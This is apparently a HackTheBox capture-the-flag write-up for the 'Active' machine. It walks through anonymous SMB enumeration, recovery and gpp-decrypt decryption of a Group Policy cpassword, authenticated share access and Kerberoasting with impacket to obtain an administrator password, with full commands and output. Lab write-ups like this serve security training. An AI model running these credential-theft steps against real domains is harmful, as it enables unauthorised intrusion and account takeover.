---
title: HackTheBox-Active
date: 2024-12-23 09:38:00 +/-TTTT
categories: [boxes, red-teaming]
tags: [gpp-decrypt, kerberoast]     # TAG names should always be lowercase
image : /assets/images/0_4We2obJR4nefl9lA.png
---

## SMB enum

    ➜  active nxc smb 10.10.10.100
    SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)

    ➜  active nxc smb 10.10.10.100 -u '' -p '' --shares
    SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
    SMB         10.10.10.100    445    DC               [+] active.htb\: 
    SMB         10.10.10.100    445    DC               [*] Enumerated shares
    SMB         10.10.10.100    445    DC               Share           Permissions     Remark
    SMB         10.10.10.100    445    DC               -----           -----------     ------
    SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
    SMB         10.10.10.100    445    DC               C$                              Default share
    SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
    SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share
    SMB         10.10.10.100    445    DC               Replication     READ            
    SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share                                                                                      
    SMB         10.10.10.100    445    DC               Users  

### xml file
    ➜  active cat Groups.xml 
    <?xml version="1.0" encoding="utf-8"?>
    <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
    </Groups>

## gpp-decrypt 

    ➜  active gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

    name="active.htb\SVC_TGS

    SVC_TGS : GPPstillStandingStrong2k18

## shares again

    ➜  active nxc smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
    SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
    SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
    ➜  active nxc smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
    SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
    SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
    SMB         10.10.10.100    445    DC               [*] Enumerated shares
    SMB         10.10.10.100    445    DC               Share           Permissions     Remark
    SMB         10.10.10.100    445    DC               -----           -----------     ------
    SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
    SMB         10.10.10.100    445    DC               C$                              Default share
    SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
    SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share                                                                                      
    SMB         10.10.10.100    445    DC               Replication     READ            
    SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share                                                                                      
    SMB         10.10.10.100    445    DC               Users           READ   

>if u have username:password GetUsersSPNs.

>if u have users list then go GetNPUsers

## Kerberoas

    ➜  active impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS


    Ticketmaster1968


and we got admin pass

    !!!IMPORTANT psexec,wmiexec or any other just for admins.

Video walkthrough
[WATCH!](https://youtu.be/njYbuCAJGno?si=291iRorni-030Wan)

